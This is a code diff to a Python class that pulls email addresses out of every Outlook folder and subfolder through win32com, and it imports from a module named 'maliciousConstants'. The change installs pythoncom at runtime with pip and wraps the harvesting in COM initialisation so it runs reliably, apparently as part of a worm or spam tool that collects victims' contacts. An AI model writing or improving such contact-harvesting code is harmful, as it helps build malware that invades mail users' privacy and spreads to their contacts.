@@ -5,6 +5,8 @@ Class that extracts email addresses from outlook folders
 import subprocess
 
 subprocess.run(["pip", "install", "-U", "pypiwin32"])
+subprocess.run(["pip", "install", "-U", "pythoncom"])
+import pythoncom
 import win32com.client
 
 from maliciousConstants import LEN_LIMIT, AT, OUTLOOK_APP, MAPI
@@ -16,7 +18,7 @@ class Contacts(object):
         Method that creates contact object
         """
         self.email_addresses = []
-        
+
     def get_email_addresses(self):
         """
         Method that retrieves email addresses from Outlook that are
@@ -24,15 +26,19 @@ class Contacts(object):
         :return:
         """
         # Access outlook folders that contain email messages
-        outlook = win32com.client.Dispatch(OUTLOOK_APP).GetNamespace(MAPI)
-        folders = outlook.Folders
-        folder_threads = []
+        pythoncom.CoInitialize()
+        try:
+            outlook = win32com.client.Dispatch(OUTLOOK_APP).GetNamespace(MAPI)
+            folders = outlook.Folders
+            folder_threads = []
 
-        # Iterate through folders
-        for folder in folders:
-            # Iterate through subfolders
-            for inner_folder in folder.Folders:
-                self.search_for_recipients(inner_folder)
+            # Iterate through folders
+            for folder in folders:
+                # Iterate through subfolders
+                for inner_folder in folder.Folders:
+                    self.search_for_recipients(inner_folder)
+        finally:
+            pythoncom.CoUninitialize()
 
     def search_for_recipients(self, inner_folder):
         """
